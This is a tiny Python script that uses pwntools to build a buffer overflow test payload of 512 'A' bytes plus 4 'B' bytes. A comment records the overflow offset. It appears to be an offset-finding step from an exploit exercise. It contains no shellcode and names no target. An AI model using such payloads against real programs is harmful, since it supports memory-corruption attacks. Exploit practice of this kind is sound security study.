from pwn import *
import sys


payload = ""
payload += "A" * 512 + "B" * 4

sys.stdout.write(payload)

# offset 0x31724130 @ 512
